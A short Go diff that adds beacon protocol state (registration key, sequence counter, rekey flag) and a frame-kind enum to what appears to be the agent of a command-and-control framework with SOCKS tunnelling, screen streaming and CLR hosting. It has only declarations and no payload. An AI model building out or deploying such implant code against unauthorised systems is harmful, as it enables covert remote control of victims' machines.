@@ -26,6 +26,15 @@ type socksFrame = protocol.SocksFrame
 // CurrentProtocolVersion mirrors the server's supported protocol version.
 const CurrentProtocolVersion = protocol.CurrentProtocolVersion
 
+// agentFrameKind classifies the envelope the agent builds for a beacon.
+type agentFrameKind int
+
+const (
+	agentFrameRegister  agentFrameKind = iota // one-time v2 registration with the identity key
+	agentFrameHandshake                       // authenticated ECDH handshake (rekey / restart recovery)
+	agentFrameEncrypted                       // ciphertext frame with an established session
+)
+
 var (
 	client          *http.Client
 	agentUUID       string
@@ -39,6 +48,13 @@ var (
 	screenStreaming int32 // atomic: 0=false, 1=true
 	inFastMode      atomic.Bool
 	useCLRHosting   bool
+
+	// v2 beacon protocol state
+	agentRegKey    []byte     // per-agent registration key derived from the beacon key (nil = not usable)
+	beaconSeq      uint64     // monotonic per-agent frame sequence (persisted; never goes backwards)
+	registered     bool       // identity key bound on the server (persisted marker)
+	rekeyRequested bool       // server asked for a fresh session key (honoured next beacon)
+	seqMu          sync.Mutex // guards beaconSeq/registered/rekeyRequested
 
 	// Beacon failure tracking for exponential backoff
 	beaconConsecutiveFailures int
